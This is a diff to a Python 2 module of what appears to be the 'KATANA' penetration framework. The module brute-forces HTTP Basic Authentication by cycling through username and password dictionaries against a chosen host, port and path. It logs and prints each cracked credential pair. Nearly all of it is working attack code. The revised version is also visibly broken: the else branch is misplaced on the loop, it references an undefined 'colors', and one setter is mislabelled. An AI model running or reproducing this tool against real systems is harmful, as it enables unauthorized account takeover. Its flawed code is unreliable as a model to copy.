@@ -1,118 +1,131 @@
-# KATANA
-# Brute Force HTTP Authentication
-# Script by RedToor
-# 27/02/2015
-
-from core import help
-import time
-import socket
-import base64
-W  = '\033[0m'  
-R  = '\033[31m' 
-G  = '\033[32m' 
-O  = '\033[33m' 
-B  = '\033[34m' 
-P  = '\033[35m' 
-C  = '\033[36m' 
-GR = '\033[37m'
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# @KATANA                     #
+# Modules   : Brute Force 403 #
+# Script by : RedToor         #
+# Date      : 27/02/2015      #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Katana Core                 #
+from core.design import *     #
+from core import help         #
+from core import ping         #
+d=DESIGN()                    #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Libraries                   #
+import time                   #
+import socket                 #
+import base64                 #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Default                     #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
 defaulthost="127.0.0.1"
 defaultport="80"
 defaultpach="/"
 defaultdic1="core/db/user.dicc"
 defaultdic2="core/db/pass.dicc"
-def httpbt():
+# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
+
+def run(para,parb,parc,pard,pare):
 	global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
-	actions = raw_input(O+"     ktn/web/httpbt > "+W)
-	if actions == "show options":
-		print ""
-		print "     ["+R+"+"+W+"] options"
-		print "     |target         : yes"
-		print "     |port           : no/yes"
-		print "     |patch          : no/yes"
-		print "     |dictionaries   : no/yes\n"
-		print ""
-		print "     ["+G+"+"+W+"] options current"
-		print "     |target         : ",defaulthost
-		print "     |port           : ",defaultport
-		print "     |patch          : ",defaultpach
-		print "     |dictionary_1   : ",defaultdic1
-		print "     |dictionary_2   : ",defaultdic2
-		print ""
-		httpbt()
-	elif actions=="back":
-		exit()
-	elif actions=="exit":
-		print C+"     GooD"+W+" bye."
-		exit()
-	elif actions[0:10] == "set target":
-			defaulthost = actions[11:]
-			defaulthost = defaulthost.replace("http://", "")
-			print "     target         : "+defaulthost+" "+O+"     Saved!!!"+W
-			httpbt()
-	elif actions[0:8] == "set port":
-			defaultport = actions[9:]
-			print "     port           : "+defaultport+" "+O+"     Saved!!!"+W
-			httpbt()
-	elif actions[0:9] == "set patch":
-			defaultpach = actions[10:]
-			print "     patch          : "+defaultpach+" "+O+"     Saved!!!"+W
-			httpbt()
-	elif actions[0:16] == "set dictionary_1":
-			defaultdic1 = actions[17:]
-			print "     dictionary_1   : "+defaultdic1+" "+O+"     Saved!!!"+W
-			httpbt()
-	elif actions[0:16] == "set dictionary_2":
-			defaultdic2 = actions[17:]
-			print "     dictionary_2   : "+defaultdic2+" "+O+"     Saved!!!"+W
-			httpbt()
-	elif actions == "help":
-		help.help()
-	elif actions == "run":
-			print("\n     ["+O+"!"+W+"] Checking target")
-			print "     ["+G+"+"+W+"] options current"
-			print "     target         : "+defaulthost
-			print "     port           : "+defaultport
-			print "     patch          : "+defaultpach
-			print "     dictionary_1   : "+defaultdic1
-			print "     dictionary_2   : "+defaultdic2
-			print ""
+	defaulthost=para
+	defaultport=parb
+	defaultpach=parc
+	defaultdic1=pard
+	defaultdic2=pare
+	httpbt(1)
+
+def httpbt(run):
+	try:
+		global defaulthost,defaultport,defaultpach,defaultdic1,defaultdic2
+		if run!=1:
+			actions=raw_input(d.prompt("web/httpbt"))
+		else:
+			actions="run"
+		if actions == "show options" or actions == "sop":
+			d.option()
+			d.descrip("target","yes","IP or DNS",defaulthost)
+			d.descrip("port","no","Port of target",defaultport)
+			d.descrip("patch","yes","Folder or dir",defaultpach)
+ 			d.descrip("dict_1","yes","Dictionary user",defaultdic1)
+ 			d.descrip("dict_2","yes","Dictionary pass",defaultdic2)
+ 			print ""
+		elif actions[0:10] == "set target":
+				defaulthost = actions[11:]
+				defaulthost = defaulthost.replace("http://", "")
+				d.change("target",defaulthost)
+				httpbt(0)
+		elif actions[0:8] == "set port":
+				defaultport = actions[9:]
+				d.change("port",defaultport)
+				httpbt(0)
+		elif actions[0:9] == "set patch":
+				defaultpach = actions[10:]
+				d.change("patch",defaultpach)
+				httpbt(0)
+		elif actions[0:10] == "set dict_1":
+				defaultdic1 = actions[11:]
+				d.change("dict_1",defaultdic1)
+				httpbt(0)
+		elif actions[0:10] == "set dict_2":
+				defaultdic2 = actions[11:]
+				d.change("dict_1",defaultdic2)
+				httpbt(0)
+		elif actions=="exit" or actions=="x":
+			d.goodbye()
+			exit()
+		elif actions=="help" or actions=="h":
+			help.help()
+		elif actions=="back" or actions=="b":
+			return
+		elif actions=="run"  or actions=="r":
+			d.run()
 			try:
-				red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)       
-				red.connect((defaulthost, int(defaultport))) 
+				ping.live(defaulthost,defaultport)
 				if True:
-					print("     ["+G+"+"+W+"] target LIVE")
-					print("     ["+G+"+"+W+"] Running")
+					red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
+					red.connect((defaulthost, int(defaultport))) 
 					try:
-						with open(defaultdic1,'r') as user:
-							for us in user: 
-								with open(defaultdic2,'r') as passs:
-									for ps in passs:
-										us=us.replace("\n","")
-										ps=ps.replace("\n","")
-										red.send("GET "+defaultpach+" HTTP/1.1\r\n")							
-										red.send("HOST: "+defaulthost+"\r\n")							
-										red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
-										last=red.recv(1000)	
-										if last.find("401")<=0:
-											log=open('core/logs/logsBruteForce.log','a')
-											log.write('\n ===================================== ')
-											log.write('\n Module  : BruteForceHTTP')
-											log.write('\n Data    : '+time.strftime('%c'))
-											log.write('\n target  : '+defaulthost)
-											log.write('\n port    : '+defaultport)
-											log.write('\n patch   : '+defaultpach)
-											log.write('\n Cracked : username : '+us+' , password : '+ps)
-											log.close()
-											print "     ["+G+"+"+W+"] Successfully with user: "+us+" , pass: "+ps+"\n"
-											red.close
-											httpbt()
-										else:
-											print "     ["+O+"!"+W+"] Checking with user: "+us+" , pass: "+ps
-											red.close
-					except(KeyboardInterrupt, SystemExit):
-						print("   ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
+						d.loading()
+						try:
+							with open(defaultdic1,'r') as user:
+								for us in user: 
+									try:
+										with open(defaultdic2,'r') as passs:
+											for ps in passs:
+												us=us.replace("\n","")
+												ps=ps.replace("\n","")
+												red.send("GET "+defaultpach+" HTTP/1.1\r\n")							
+												red.send("HOST: "+defaulthost+"\r\n")							
+												red.send("Authorization:Basic "+base64.b64encode(us+":"+ps)+"\r\n\r\n")  
+												last=red.recv(1000)	
+												if last.find("401")<=0:
+													log=open('core/logs/logsBruteForce.log','a')
+													log.write('\n ===================================== ')
+													log.write('\n Module  : BruteForceHTTP')
+													log.write('\n Data    : '+time.strftime('%c'))
+													log.write('\n target  : '+defaulthost)
+													log.write('\n port    : '+defaultport)
+													log.write('\n patch   : '+defaultpach)
+													log.write('\n Cracked : username : '+us+' , password : '+ps)
+													log.close()
+													d.sucess(us,ps)
+													red.close
+													httpbt(0)
+											else:
+												print " ["+colors[4]+"!"+colors[0]+"] Checking (username="+us+")(password="+ps+")"
+												red.close
+									except:
+										d.filenot()
+										httpbt(0)
+						except:
+							d.filenot()
+							httpbt(0)
+					except:
+						d.kbi()
 			except:
-				print("     ["+R+"-"+W+"] target off")
-	else:
-		print "     ["+O+"!"+W+"] command No Accept"+W
-	httpbt()
+				d.off()
+		else:
+			d.nocommand()
+	except:
+		d.kbi()
+		exit()
+	httpbt(0)
